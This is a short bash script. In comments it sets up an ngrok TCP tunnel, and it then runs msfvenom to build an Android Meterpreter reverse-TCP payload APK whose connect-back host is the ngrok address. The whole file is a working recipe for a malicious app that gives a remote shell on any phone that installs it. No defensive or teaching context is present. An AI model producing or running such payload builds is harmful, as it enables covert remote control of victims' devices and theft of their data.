#!/bin/bash
#./ngrok tcp 666
#tcp://0.tcp.ngrok.io:18360 -> localhost:666  
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=18360 R > payload.apk

